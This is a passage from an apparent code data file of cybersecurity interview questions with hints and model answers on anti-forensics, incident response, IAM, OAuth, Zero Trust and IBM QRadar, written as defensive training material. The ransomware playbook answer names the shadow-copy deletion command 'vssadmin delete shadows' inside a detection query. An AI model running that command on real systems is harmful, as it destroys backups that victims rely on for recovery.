from initial access through lateral movement requires correlating logs from multiple sources on a common timeline.` },
      { q:"What is anti-forensics and how do you counter common techniques?", hint:"Timestomping: modify file timestamps. Log deletion/clearing. Encryption. Steganography. File system artefacts survive (USN Journal, $LogFile, Volume Shadow Copies). Memory forensics bypasses disk-based anti-forensics. Log forwarding to SIEM before deletion.", answer:`Anti-forensics encompasses techniques used to obstruct, mislead, or destroy forensic evidence. Timestomping: modifying file MAC timestamps (Modified, Accessed, Created) to blend a malicious file into legitimate activity or set it to a date before the OS was installed. Counter: NTFS maintains two sets of timestamps - the $STANDARD_INFORMATION attribute (visible in Explorer, susceptible to timestomping with tools like Metasploit's timestomp) and the $FILE_NAME attribute (updated by the filesystem, harder to modify without kernel access). Discrepancy between the two is a strong indicator of timestomping. USN Journal records each file system change with the actual time of modification. Log deletion: clearing Windows Event Logs (Event ID 1102 in Security log is generated when logs are cleared - the act of clearing is itself logged if forwarding is configured). Counter: forward logs to a centralised SIEM in real-time - logs cleared locally are already preserved remotely. Linux: shred or secure-delete for log files. Counter: immutable logging infrastructure (append-only log stores, syslog-ng/rsyslog forwarding). Encryption: ransomware encrypts files to deny evidence. Full-disk encryption (BitLocker) makes disk imaging less useful. Counter: RAM acquisition before shutdown captures encryption keys in memory; Volume Shadow Copies may preserve unencrypted versions. Steganography hides data within image, audio, or other files. Counter: stegdetect, StegExpose for detection. Anti-forensics highlight why memory forensics and centralised log aggregation are essential - they preserve evidence that disk-based anti-forensics cannot easily destroy.` },
    ],
    'incident response': [
      { q:"What are the six phases of the NIST incident response lifecycle?", hint:"Preparation -> Identification -> Containment -> Eradication -> Recovery -> Lessons Learned (Post-Incident Review). SANS uses similar PICERL model. Each phase has specific activities and outputs.", answer:`The NIST SP 800-61 incident response lifecycle provides the standard framework. Phase 1 - Preparation: build the capability before incidents occur. Develop IR policy, procedures, and playbooks for common incident types (ransomware, data breach, DDoS). Assemble and train the CIRT (Computer Incident Response Team). Deploy detection tooling (SIEM, EDR, IDS/IPS). Establish communication plans: who is notified when, escalation paths, external contacts (legal counsel, law enforcement, forensic retainer). Phase 2 - Detection and Analysis (Identification): detect that an incident has occurred via SIEM alerts, EDR detections, user reports, threat intelligence. Analyse to confirm it is a true positive, classify the incident type and severity, determine scope (how many systems, what data affected?), and assign an incident commander. Phase 3 - Containment: prevent further damage. Short-term containment (isolate affected systems from the network while preserving forensic evidence). Long-term containment (apply temporary mitigations to keep business running while preparing for eradication). Phase 4 - Eradication: remove the threat actor from the environment. Remove malware, close attack vectors (patch vulnerability, reset compromised credentials), identify and remove all persistence mechanisms. Phase 5 - Recovery: restore systems to normal operation. Restore from clean backups, rebuild compromised systems, verify no indicators of compromise remain, monitor closely for recurrence. Phase 6 - Post-Incident Activity (Lessons Learned): within 1-2 weeks of incident closure, conduct a blameless review. What happened, timeline, what worked, what failed, what will be improved. Update playbooks and controls.` },
      { q:"How do you triage and classify an incoming security incident?", hint:"Severity classification: Critical (data breach, ransomware, full compromise) -> High -> Medium -> Low. Triage: confirm true positive, determine scope, identify affected assets and data, initial impact assessment. Incident commander and comms.", answer:`Incident triage determines how quickly and forcefully to respond. Initial confirmation: distinguish true positives from false positives. A SIEM alert for 'failed login attempts' may be a user forgetting their password or a credential stuffing attack - context determines the response. Indicators to elevate: alert correlated with known threat actor TTPs, multiple alerts across different detection layers, user reports of unusual behaviour, C2 traffic to known malicious IPs. Classification criteria: Critical - active ransomware encryption, confirmed data exfiltration, full domain compromise, critical infrastructure affected. High - confirmed attacker presence with lateral movement, active C2 communication, high-value system compromise. Medium - isolated malware on single endpoint, unsuccessful exploitation attempt, policy violation with potential data risk. Low - phishing email delivered (not clicked), policy violation, minor misconfiguration. Classification drives SLA: Critical = 15-minute response, continuous work until contained; High = 1-hour response; Medium = 4 hours; Low = next business day. Scoping questions: which systems are affected (start with the initially identified system, expand via log correlation and lateral movement analysis)? What data could be affected (check what data the compromised system holds or has access to)? Is the attacker still active or a historical compromise? Notification: for Critical incidents, immediately notify CISO, legal (data breach notification obligations under GDPR start from the moment you become aware), and invoke the incident response retainer if needed.` },
      { q:"Walk me through containing and eradicating a ransomware outbreak.", hint:"Isolate affected systems (unplug network, not power). Identify patient zero and initial access vector. Preserve forensic evidence before remediation. Check backups for ransomware presence. Eradicate all persistence. Rebuild from known-good. Reset all credentials.", answer:`Ransomware response requires speed to limit encryption spread while preserving forensic evidence. Immediate containment: isolate all confirmed-encrypted systems by disconnecting their network cables or disabling their switch ports - do not power off (preserves RAM for forensic acquisition and avoids filesystem corruption). Identify other systems communicating with C2 (firewall logs, DNS queries) and isolate proactively. Emergency actions: disable SMB (closes EternalBlue/lateral movement vector), block suspicious outbound connections at the perimeter. Evidence preservation: before any remediation, image RAM and critical disks from affected systems - determines ransomware family, attacker TTPs, and the initial access vector (essential for eradication). Identify patient zero: work backwards from the earliest encrypted files and earliest ransomware process execution (Event ID 4688 with Sysmon). Initial access vectors: phishing email attachment, RDP brute force (check event logs for 4625/4624 from external IPs), unpatched VPN vulnerability. Backup assessment: before restoring, verify backups are clean - many ransomware strains specifically encrypt or delete backup systems and shadow copies. Test restore a backup in an isolated environment. Eradication: identify all persistence mechanisms (scheduled tasks, registry run keys, new user accounts, implanted webshells, malicious services). Remove all malware artefacts from every affected system. Patch the initial access vulnerability. Reset all compromised credentials - assume all credentials on affected systems are compromised (Mimikatz). Recovery: rebuild systems from trusted golden images rather than attempting to clean them - rebuild is faster and guaranteed clean. Monitor for recurrence intensively for 30 days post-recovery.` },
      { q:"What is the difference between containment and eradication in incident response?", hint:"Containment: stop the bleeding, prevent spread, preserve evidence, maintain business continuity. Eradication: remove the threat actor completely from the environment (all persistence, all compromised accounts, all malware). Eradication requires complete attacker eviction.", answer:`Containment and eradication are sequential and distinct phases with different objectives. Containment's goal is to limit damage and prevent the incident from spreading - not necessarily to remove the attacker from the environment. Short-term containment prioritises speed: isolate the affected system(s) from the network (pulling the network cable, disabling switch ports, placing in a quarantine VLAN). The attacker may still be on the isolated system but cannot reach other systems. Business continuity is a key consideration in containment - you cannot shut down a hospital's patient record system without arranging alternative procedures. Long-term containment involves applying temporary workarounds to keep the business functioning while preparing for full eradication: blocking the C2 IP at the perimeter, applying a hotfix for the exploited vulnerability, resetting compromised accounts. Eradication's goal is complete removal of the threat actor from the entire environment. This requires a thorough understanding of the full scope first - rushing to eradication before establishing scope risks missing a backdoor that gives the attacker re-entry. Eradication actions: remove all malware from all infected systems; remove all persistence mechanisms (not just the primary implant - check for secondary backdoors, new accounts, scheduled tasks, registry run keys, WMI event subscriptions); patch or mitigate the initial access vulnerability; reset all compromised credentials, including service accounts, and rotate API keys and secrets that may have been accessed. The sequence matters: containment first (stop the bleeding), then full scope analysis, then thorough eradication, then recovery. Skipping or rushing any step leads to reinfection.` },
      { q:"How do you build and test an incident response playbook?", hint:"Playbook: step-by-step procedure for a specific incident type. Sections: trigger conditions, severity classification, roles/responsibilities, detection steps, containment steps, eradication steps, comms templates. Test via tabletop exercises and purple team exercises.", answer:`An IR playbook transforms a chaotic security incident into a structured, repeatable process. Playbook structure: Trigger - what alerts, IoCs, or reports initiate this playbook? Severity classification criteria - what makes this incident critical vs high? Roles and responsibilities - incident commander, technical lead, communications lead, legal/compliance liaison, executive notification path. Detection and analysis - specific queries to run in the SIEM/EDR to confirm and scope the incident (e.g., for ransomware: Splunk query for VSS deletion events, index=windows EventCode=524 OR EventCode=9449; check for vssadmin delete shadows commands in process creation logs). Containment procedures - specific steps with commands (not generic guidance but exact CLI commands and tool procedures). Eradication procedures - how to remove this specific malware family or attack type. Recovery procedures. External notification requirements - GDPR Article 33 requires notifying the supervisory authority within 72 hours of a data breach; playbook should include the notification template and contacts. Communication templates - prepared stakeholder updates at T+1h, T+4h, T+24h that can be quickly customised. Testing: tabletop exercise - gather the IR team, present a scenario ('You receive an alert that 50 endpoints have started encrypting files at 2am'), walk through the playbook verbally, identify gaps and unclear steps. Tabletop is low-cost but limited. Purple team exercise - the red team conducts a simulated attack while the blue team responds in real-time using the playbook - reveals gaps in both detection and response that tabletop cannot. Update the playbook after every real incident and test.` },
      { q:"How do you conduct an effective post-incident review?", hint:"Blameless culture: focus on process and systems, not individuals. Timeline reconstruction. 5 Whys for root cause. What worked/failed in detection and response. Action items: owner + due date + metric. Update playbooks and controls.", answer:`A post-incident review (PIR), also called a lessons learned or after-action review, extracts learning from the incident to improve future detection and response. Timing: hold within 1-2 weeks of incident closure - recent enough that details are fresh, distant enough that the immediate pressure is gone. Blameless culture (derived from Google's Site Reliability Engineering practice): the goal is to understand what happened and improve systems and processes, not to assign blame to individuals. When people fear blame, they become defensive and withhold information - the learning is lost. Framing: 'The system had a gap in detection coverage' not 'Alice missed the alert'. Timeline reconstruction: using SIEM logs, ticket history, and participant notes, construct an authoritative timeline from initial compromise to containment. Key questions: when did the attacker gain initial access? When was the first alert generated? When was the incident declared? When was containment achieved? The gaps between these reveal where improvement is needed. Root cause analysis: use 5 Whys or Fishbone diagrams to identify contributing factors - not just the proximate cause ('the attacker exploited an unpatched vulnerability') but the systemic cause ('the vulnerability was unpatched because the patch management process excludes systems in the legacy category'). Areas to evaluate: detection (did we have visibility? were alerts actionable?), response (did the playbook cover this scenario? were roles clear?), communication (were the right people notified promptly?), technical controls (what control failure allowed the attacker to succeed?). Output: action items with specific owners, due dates, and success metrics. Track completion in the next 30-60-90 day reviews.` },
      { q:"What metrics do you track to measure the effectiveness of an IR programme?", hint:"MTTD (Mean Time to Detect). MTTR (Mean Time to Respond/Contain). MTTC (Mean Time to Close). Dwell time (initial compromise to detection). False positive rate. % incidents contained within SLA. Cost per incident.", answer:`IR programme metrics enable data-driven improvement and demonstrate programme value to leadership. Detection metrics: MTTD (Mean Time to Detect) - average time between the attacker's first action and the organisation's detection. The IBM Cost of a Data Breach report consistently shows that incidents with longer dwell time cost significantly more - reducing MTTD directly reduces breach impact. Dwell time (also called time-to-detect) measures from initial compromise (determined retroactively via forensic analysis) to first detection. Industry average dwell time was 207 days in IBM's 2023 report; organisations with mature security programmes achieve under 30 days. Response metrics: MTTR (Mean Time to Respond) - from detection to containment actions beginning; MTTC (Mean Time to Contain) - from detection to the threat being fully contained. Resolution metrics: MTTR (Mean Time to Resolve/Close) - from detection to full resolution and system restoration. Alert quality: false positive rate = false positive alerts / total alerts. A high false positive rate (> 50%) leads to alert fatigue and missed true positives. Track by detection rule to identify which rules need tuning. SLA adherence: % Critical incidents contained within 1 hour. % High incidents contained within 4 hours. Business impact: cost per incident (staff time, external forensics, breach notification, regulatory fines, business disruption). Trend these metrics monthly - improvement over time demonstrates programme maturity. Compare against industry benchmarks (IBM Cost of Data Breach, Verizon DBIR) for context.` },
    ],
    iam: [
      { q:"What are the core components of an IAM system?", hint:"Identity (who): users, service accounts, devices. Authentication (prove identity): password, MFA, certificate. Authorisation (what can they do): RBAC, ABAC. Accounting/Audit: log all access. Directory: LDAP, Active Directory, IdP.", answer:`IAM (Identity and Access Management) is the framework of policies and technologies controlling who can access what resources under what conditions. Identity: a digital representation of an entity - user accounts (human), service accounts (applications), machine identities (servers, containers), and device identities. Each identity has attributes (name, email, department, role) stored in an identity provider (IdP) such as Active Directory, Okta, Azure AD, or Ping Identity. Authentication: the process of verifying an identity is who they claim to be. Factors: knowledge (password, PIN), possession (hardware token, phone with TOTP app), inherence (biometric). Multi-factor authentication (MFA) requires at least two factors - dramatically reduces account takeover risk. Modern authentication uses SAML 2.0 or OpenID Connect for federated authentication, eliminating per-application passwords. Authorisation: determining what an authenticated identity can do. RBAC (Role-Based Access Control) assigns permissions to roles, and users are assigned roles - a 'Developer' role has access to dev environments but not production secrets. ABAC (Attribute-Based Access Control) makes decisions based on attributes of the user, resource, environment, and action - more flexible and granular than RBAC. Audit/Accounting: all access events are logged - who accessed what resource, from where, at what time, and what they did. Logs feed SIEM for anomaly detection and compliance reporting (SOX, HIPAA, GDPR access logs). Lifecycle management: provisioning (granting access when someone joins), de-provisioning (revoking access when they leave or change role - must be immediate and complete), access reviews (periodic certification that each access grant is still necessary).` },
      { q:"What is OAuth 2.0 and how does it work?", hint:"OAuth 2.0: authorisation framework (not authentication). Roles: resource owner, client, authorisation server, resource server. Flows: authorisation code (web apps), PKCE (SPAs/mobile), client credentials (M2M). Access tokens and refresh tokens.", answer:`OAuth 2.0 is an authorisation framework that allows a third-party application to obtain limited access to a resource on behalf of a resource owner without sharing credentials. It is not an authentication protocol (that is OpenID Connect, which is built on top of OAuth 2.0). The four roles: Resource Owner - the user who owns the data. Client - the application requesting access (e.g., a mobile app wanting to read your calendar). Authorisation Server - the server that issues access tokens after the resource owner grants permission (Google, Okta, Azure AD). Resource Server - the API that holds the protected resources. Authorisation Code Flow (for web apps with a backend): the client redirects the user to the authorisation server; the user authenticates and consents; the authorisation server redirects back to the client with an authorisation code; the client exchanges the code (with its client secret) for an access token and refresh token. The access token is short-lived (15-60 minutes); the refresh token is used to obtain new access tokens without re-authentication. PKCE (Proof Key for Code Exchange): the authorisation code flow for SPAs and mobile apps where a client secret cannot be safely stored. A code verifier (random string) and code challenge (SHA-256 hash of the verifier) are used to bind the authorisation code to the client - prevents authorisation code interception attacks. Client Credentials Flow: for machine-to-machine (M2M) communication where there is no user - a service authenticates directly with the authorisation server using its client ID and secret to obtain a token. OpenID Connect adds an ID token (JWT containing user identity claims) on top of OAuth 2.0, enabling authentication.` },
      { q:"Explain the principle of least privilege and how you implement it in practice.", hint:"Each identity should have only the minimum permissions required to perform their function - no more. Implementation: start with zero, grant specifically. Regular access reviews. Just-in-time (JIT) access for privileged operations. Privilege separation.", answer:`The principle of least privilege (PoLP) holds that every user, process, and system component should have access only to the resources and permissions needed to perform its specific function - and nothing more. The principle minimises the blast radius of a compromised account or process: a developer account with read-only access to production cannot be used to delete databases; an application with SELECT permission cannot be used to exfiltrate via bulk INSERT into an attacker-controlled table. Implementation: start with zero access and grant specifically, rather than starting with broad access and restricting. RBAC: define roles aligned to job functions with minimum necessary permissions - a 'Customer Support' role can read order data but not modify it; a 'DBA' role can query but not export customer PII in bulk. Service accounts: each microservice should have its own identity with access only to the specific resources it needs - not a shared admin account. Regular access reviews (access certification): quarterly review of all access grants where managers certify that each access is still required - remove access that is no longer needed (especially for employees who changed roles). Just-in-time (JIT) access for privileged operations: rather than permanently granting admin rights, use PAM tools (CyberArk, HashiCorp Vault, Azure PIM) to provide temporary elevated access for a specific task with approval workflow and session recording. The elevation expires automatically. Privilege separation for developers: developers should not have production access during normal operations - changes go through CI/CD pipelines with appropriate controls. Emergency access ('break-glass' accounts) exists but triggers automatic alerts and requires post-hoc justification.` },
      { q:"What is Privileged Access Management (PAM) and why is it critical?", hint:"PAM controls and audits privileged accounts (admin, root, service accounts). Components: vault (credential storage), session recording, just-in-time access, password rotation. Tools: CyberArk, BeyondTrust, HashiCorp Vault. Reduces insider threat and credential theft blast radius.", answer:`Privileged Access Management is a specialised IAM discipline focused on securing, controlling, and auditing the use of privileged accounts - accounts with elevated access to systems, applications, databases, or infrastructure (root, administrator, service accounts, DBA accounts). Why critical: privileged accounts are the primary target of attackers - Verizon DBIR consistently shows that credential abuse (often involving privileged accounts) is involved in the majority of breaches. A single compromised domain admin account in Active Directory gives an attacker control of the entire Windows estate. Core PAM capabilities: Credential Vault: privileged account passwords are stored in an encrypted vault (CyberArk Vault, HashiCorp Vault, BeyondTrust) - administrators check out credentials from the vault for their session; the vault enforces access approval, logs checkout events, and automatically rotates the password after the session. No human ever knows the permanent password. Session Recording: all privileged sessions (SSH, RDP, database console) are recorded and stored - provides a complete audit trail of every action taken during a privileged session and enables forensic investigation. Just-in-time (JIT) access: privileged access is granted for a specific task and duration, with automatic expiration - eliminates standing privileges that persist indefinitely. Password rotation: automatically rotates privileged account passwords on a schedule or after each use - a rotated password cannot be reused by an attacker who captured it. Service account management: vaulting service account credentials and rotating them programmatically eliminates hardcoded passwords in application configuration files.` },
      { q:"How do you implement Zero Trust architecture and how does it change IAM?", hint:"Zero Trust: never trust, always verify. No implicit trust based on network location. Every request authenticated and authorised. Microsegmentation. Device health check. Identity is the new perimeter. BeyondCorp model.", answer:`Zero Trust is an architecture built on the principle that no user, device, or network should be trusted by default - even inside the corporate network perimeter. Traditional castle-and-moat security implicitly trusted anything inside the network perimeter; once an attacker breached the perimeter (via VPN compromise, phishing, or physical access), they had broad lateral movement capability. Zero Trust eliminates this implicit trust. Core tenets: verify explicitly - every access request must be authenticated and authorised regardless of network location (office, home, cloud). Verify identity (strong authentication, MFA), device health (is the device managed, patched, compliant?), context (is this request consistent with normal behaviour patterns?). Least privilege access - just-in-time, just-enough access. Assume breach - operate as if the attacker is already inside; segment everything to limit blast radius. Google's BeyondCorp model (published 2014) eliminated the VPN perimeter entirely - all access to internal applications goes through an access proxy that validates identity and device health on every request, regardless of whether the user is in the office or at home. IAM implications: identity becomes the new perimeter. Every service-to-service call must be authenticated (mutual TLS or service mesh with SPIFFE/SPIRE). Network-based access controls alone are insufficient. Implement: identity-aware proxy (Google BeyondCorp Enterprise, Cloudflare Access, Zscaler ZPA) in front of all internal applications; device trust enforced via MDM (Jamf, Intune) with compliance checks at authentication time; continuous authorisation (re-evaluate access based on risk signals throughout the session, not just at login).` },
      { q:"How do you handle federated identity and SSO across multiple applications?", hint:"SAML 2.0: XML-based, enterprise apps. OpenID Connect (OIDC): JSON/JWT, modern apps. IdP (Okta, Azure AD) issues assertions. SP-initiated vs IdP-initiated flows. JIT provisioning. SCIM for user lifecycle sync.", answer:`Federated identity allows a user to authenticate once with an Identity Provider (IdP) and access multiple applications (Service Providers/Relying Parties) without re-authenticating - Single Sign-On. SAML 2.0 (Security Assertion Markup Language): XML-based federation protocol used predominantly in enterprise environments. The IdP (Okta, Azure AD, Ping) issues a signed XML SAML assertion containing user identity and attributes. SP-initiated flow: the user visits the application (SP), is redirected to the IdP for authentication, receives a SAML assertion, and is redirected back to the SP. IdP-initiated flow: the user logs into the IdP portal and clicks an application tile, pushing the assertion to the SP. Used for: enterprise SaaS apps (Salesforce, Workday, ServiceNow). OpenID Connect (OIDC): built on OAuth 2.0, JSON/JWT-based. Returns an ID token (JWT containing user identity claims: sub, email, name) alongside an OAuth 2.0 access token. Modern apps prefer OIDC due to its simplicity and alignment with REST/JSON. Used for: consumer apps, modern SaaS, mobile apps. JIT (Just-In-Time) provisioning: when a user first authenticates via SSO to an application that does not have their account, the application creates the account automatically using attributes from the SAML assertion or OIDC claims - no pre-provisioning required. SCIM (System for Cross-domain Identity Management): REST API standard for automating user provisioning and de-provisioning between the IdP and applications. When a user is deactivated in Okta/Azure AD, SCIM pushes the deactivation to all connected applications within minutes - critical for rapid de-provisioning on employee termination.` },
      { q:"How do you conduct an IAM access review and remediate findings?", hint:"Access certification: periodic review by managers of all access grants. Orphaned accounts (no owner). Excessive privileges (privilege creep). Segregation of duties violations. Tools: SailPoint, Saviynt. Remediate: revoke, reduce, and document.", answer:`Access reviews (access certification) are the primary control for detecting and remediating accumulated excessive access - 'privilege creep' where users accumulate permissions over time as roles change but old access is never revoked. Process: generate a report of all access grants from the IAM system (who has access to what, at what permission level). Assign review tasks to account owners/managers (the person who should know whether the access is still necessary). Reviewers certify each access grant as 'Approve' (access is still needed) or 'Revoke' (access is no longer needed). The IAM system automates revocation for 'Revoke' decisions. Review frequency: privileged access quarterly, standard access semi-annually, high-risk access continuously. Common findings: Orphaned accounts - accounts with no active owner (employee left but account not deprovisioned). These are high-risk because they are often not monitored and can be used by former employees or attackers. Excessive privileges - a developer who moved to management still has production deployment rights. Segregation of duties (SoD) violations - the same person can both create a payment and approve it (financial fraud risk). Toxic combinations: in financial systems, SOD rules prohibit the same person from both initiating and approving transactions; IAM systems like SailPoint enforce SoD policies and flag violations. Remediation: revoke unnecessary access immediately; reduce broad permissions to specific ones; for critical SoD violations, reassign responsibilities or implement compensating controls (enhanced monitoring). Document exceptions with business justification and periodic review dates.` },
    ],
    qradar: [
      { q:"What is IBM QRadar and how does it differ from other SIEM platforms?", hint:"QRadar: enterprise SIEM with integrated log management, network flow analysis (QFlow), and asset discovery. Unified platform vs point-solution SIEMs. Offense-based detection. Rule engine (CRE). QRadar vs Splunk: structured vs flexible.", answer:`IBM QRadar is an enterprise SIEM (Security Information and Event Management) platform that combines log management, network flow analysis, asset discovery, and threat detection in a single integrated platform. QRadar's architecture: Event Collector normalises and forwards log events; Event Processor applies detection rules; QFlow Collector captures network flow data (NetFlow, IPFIX, J-Flow) providing network visibility without requiring full packet capture. The unified data model - both log events and network flows feeding the same detection engine - is a differentiator from point solutions that handle log and network data separately. QRadar uses an offense-based detection model: it does not just alert on individual events but correlates multiple events across time and systems into Offenses representing a probable security incident. An offense aggregates all related events (e.g., multiple failed logins from one IP, then a successful login, then a large data export) with a magnitude score. Comparison with Splunk: Splunk is a flexible search and analytics platform where you build detection logic using SPL (Splunk Processing Language) - highly customisable but requires significant engineering investment to build effective detections. QRadar provides structured, pre-built detection logic (rules, use cases, DSMs) designed for security out of the box - faster to operationalise for security operations but less flexible for custom analytics. Splunk is often preferred in organisations with large data engineering teams and complex custom use cases; QRadar suits organisations wanting a structured SOC platform with IBM support and integrated compliance reporting.` },
      { q:"How does QRadar's event processing pipeline work?", hint:"Events: Collector (receive/normalise via DSMs) -> Processor (apply CRE rules) -> Console (offense management). QFlow: network flows. Log sources: auto-detected or manually configured DSMs. Normalisation: QRadar Event Payload format.", answer:`QRadar's pipeline processes security data from collection through detection. Log Collection: QRadar accepts logs via syslog (UDP/TCP 514), Syslog-TLS, JDBC pull from databases, log file monitoring, and API collection. Each log source type has a DSM (Device Support Module) - a parser that normalises raw log data into QRadar's normalised event format (QRadar Event Payload). DSMs map vendor-specific log fields to standard QRadar fields: source IP, destination IP, username, event name, event category. Auto-detection: QRadar identifies log sources by the format and source of incoming data and applies the appropriate DSM automatically. For unsupported sources, the Universal DSM allows custom regex-based parsing via the Log Activity rules. Event Processing: normalised events flow to Event Processors. The Custom Rules Engine (CRE) evaluates every event against all active rules in real-time. Rules test conditions (event properties, asset properties, historical patterns) and can generate offenses, alert via email/SNMP, add to reference sets, or trigger scripts. Flow Processing: QRadar Flow Collector captures network flows, normalises them to QRadar Flow Records containing source/destination IP and port, protocol, bytes, packets, and timestamps. Flows provide context that logs cannot - even if endpoint logging is disabled, network flows reveal communication patterns. Asset model: QRadar maintains an asset database populated by active scanning and passive discovery from flows and events - events are enriched with asset attributes (criticality, business function) affecting offense magnitude scoring.` },
      { q:"How do you write effective QRadar detection rules?", hint:"CRE (Custom Rules Engine). Rule types: event, flow, common (both). Conditions: event properties, reference sets, building blocks, historical frequency. Test rule: Run Rule Test. Building blocks for reuse. Rule response: generate offense, alert, add to reference set.", answer:`QRadar rules in the Custom Rules Engine (CRE) evaluate events and flows in real-time and trigger responses when conditions are met. Rule types: Event Rules test against individual log events or event aggregations. Flow Rules test against network flows. Common Rules test against both. Offense Rules evaluate existing offenses. Rule structure - every rule has: Test conditions (AND/OR logic): event properties (Event Name CONTAINS 'Failed Login', Source IP is in reference set 'malicious_IPs'), asset properties (Destination Asset Criticality >= High), historical patterns (this source IP generated more than 50 events in the last 5 minutes), and Building Block tests (reusable rule conditions). Responses: Generate Offense (with name, description, magnitude contribution, relevant event count threshold), Notify (email, SNMP), Add to reference set (add Source IP to 'brute_force_IPs' reference set for correlation with other rules), Dispatch new event (generate a synthetic event for further rule processing). Building Blocks (BB): rules that do not trigger responses themselves but define reusable conditions - BB:HostDefinition:DMZ Hosts defines the DMZ IP range. Other rules reference the BB rather than duplicating the IP range logic - updating the BB updates all rules referencing it. Example rule: "Successful Login After Brute Force" - Condition 1: Source IP in reference set 'recent_brute_force_sources'; Condition 2: Event Name is 'Authentication Success'; Condition 3: Username is not in 'service_accounts'. Response: Generate High offense 'Account Compromise After Brute Force'. Test with Run Rule Test against historical events before enabling.` },
      { q:"How do you tune QRadar to reduce false positives and alert fatigue?", hint:"Identify noisy rules: Dashboard > Rule Performance. Whitelist known-good sources in reference sets. Tune rule thresholds (event count, time windows). Disable unused log sources. Magnitude tuning: lower criticality on non-critical assets. Use false-positive workflow.", answer:`Alert fatigue from high false positive rates destroys SOC effectiveness - analysts begin ignoring alerts. Systematic tuning process: Identify the noisiest rules using QRadar's Dashboard > Rule Performance - displays rules by offense generation count. The top 10 noisy rules account for the majority of false-positive offenses in most environments. For each noisy rule, analyse a sample of the offenses it generates: are they valid security events or benign activity? Common false positive patterns and fixes: Vulnerability scanner IPs triggering attack detection rules - add scanner IPs to a reference set and add a negative test to the rule (Source IP NOT in 'vulnerability_scanners'). Backup jobs triggering data exfiltration rules at 2am - add a time-based exception (rule only active outside maintenance windows). Service accounts triggering authentication anomaly rules - add service account usernames to reference set 'excluded_service_accounts'. Threshold tuning: increase the event count threshold (change 'more than 3 failed logins' to 'more than 20') or extend the time window to better separate noise from signal. Asset criticality: lower the criticality rating of non-critical assets (printers, conference room displays) - offenses targeting low-criticality assets generate lower magnitude scores and are deprioritised. QRadar false-positive workflow: close an offense as 'Non-Issue' with a reason - QRadar can use this feedback to suggest rule tuning. Tune iteratively: one change at a time, monitor the impact on offense volume before the next change. Document all tuning decisions so future analysts understand why exceptions exist.` },
      { q:"How do you integrate QRadar with threat intelligence and external data sources?", hint:"Reference data: reference sets, maps, map-of-sets. Threat intelligence: IBM X-Force, STIX/TAXII feeds, custom IOC lists. App Exchange apps for integration. API-based integration. Log source extension for custom parsers.", answer:`Threat intelligence integration enhances QRadar's detection by incorporating external knowledge about known-malicious indicators. Reference Data: QRadar's reference data framework stores structured data that rules can query. Reference Sets (single-value lists): IP addresses, domains, file hashes. Reference Maps (key-value pairs): IP to country, username to department. Reference Map of Sets: IP to set of usernames. Reference Tables: multi-column structured data. Populate these via the QRadar REST API for automated IOC ingestion. IBM X-Force Exchange: QRadar natively integrates with IBM X-Force threat intelligence, automatically enriching events and offenses with X-Force reputation data for IPs, URLs, and file hashes - a Source IP with X-Force risk score above a threshold can automatically elevate offense magnitude. STIX/TAXII: use the QRadar Threat Intelligence App (QRadar App Exchange) to consume STIX/TAXII feeds from ISACs, government sources (CISA AIS), and commercial TI platforms. The app imports IOCs into reference sets automatically on a schedule. Custom IOC integration: use the QRadar API (/api/reference_data/sets/{name}) to programmatically add IOCs from internal threat hunting, incident response findings, or custom TI feeds. Rules reference these sets: Source IP in reference set 'malicious_ips' triggers an immediate High offense. Vulnerability scanner integration: import vulnerability scan results (Nessus, Qualys XML) into QRadar's vulnerability data - rules can then correlate network attacks against assets known to be vulnerable to that specific exploit.` },
      { q:"What is QRadar's offense management workflow?", hint:"Offense: correlated security incident with magnitude (0-10). Workflow: assign to analyst, investigate (log activity, flow data, asset context), document findings, close (True Positive, False Positive, Non-Issue) or escalate. SLA: close within defined timeframes.", answer:`An Offense in QRadar represents a correlated security incident - an aggregation of related events and flows with a magnitude score (0-10) reflecting the severity and confidence of the potential threat. Offense lifecycle: New offenses appear in the Offenses tab sorted by magnitude. SOC triage: the Level 1 analyst reviews the offense summary - contributing events, source and destination IPs, asset context, and the rule that triggered. Initial assessment: is this a true positive (malicious activity), likely false positive (known benign pattern), or requires investigation? Assignment: offenses are assigned to an analyst in the queue. Investigation: from the offense, pivot to Log Activity to see all related events in detail; pivot to Network Activity for flow data showing communication volume and patterns; check Asset Profiles for the criticality and business function of affected systems; search for additional related events not part of the offense (the initial offense may not capture all related activity). Annotation: document investigation findings in the offense notes - what was confirmed, what was ruled out, what was done. Closure: True Positive - incident confirmed, escalate to IR or document remediation. False Positive - benign activity mis-triggered; add tuning note. Non-Issue - low-risk activity that matches the rule but poses no threat. Protected - hide from automatic closing. Inactive - no new events for 5 days (configurable). Escalation: offenses above a magnitude threshold or involving critical assets should have defined escalation paths and SLAs. QRadar tracks time-to-close metrics per analyst and rule category.` },
      { q:"How do you use QRadar for compliance reporting (PCI DSS, SOX, HIPAA)?", hint:"QRadar Compliance Modules: pre-built reports and rules mapped to specific frameworks. Log retention: configurable by log source type. Report scheduler. Evidence: log search exports, offense reports. Audit log for QRadar admin activity.", answer:`QRadar provides compliance functionality through its compliance-focused reporting modules and log management capabilities. PCI DSS: QRadar's PCI DSS Compliance Module (available on the App Exchange) provides pre-built reports mapped to specific PCI DSS v4.0 requirements: Requirement 10 (log monitoring) - reports on log collection status for all in-scope systems, failed login monitoring (Req 10.2.1), and privileged user activity. Requirement 8 (access control) - reports on authentication events. Log retention: PCI DSS requires 12 months of log retention with 3 months immediately available. QRadar's Event Storage Manager configures retention policies by log source or event category. SOX compliance focuses on financial system access controls and change management. QRadar reports on privileged access to financial systems, configuration changes (Event Category: Configuration Change), and segregation of duties violations. HIPAA: audit log monitoring for access to ePHI - reports on who accessed patient record systems, data export events, and failed access attempts. QRadar audit logs: all administrative actions within QRadar itself (login, rule changes, report exports) are logged - critical for demonstrating that the SIEM itself is appropriately controlled. Report scheduling: compliance reports can be scheduled to run automatically and delivered to compliance stakeholders or stored in a designated evidence repository. During audits, the combination of retained logs (searchable via Log Activity), automated compliance reports, and offense history demonstrates continuous monitoring - a key requirement across most compliance frameworks.` },
    ],
    hyperledger: [
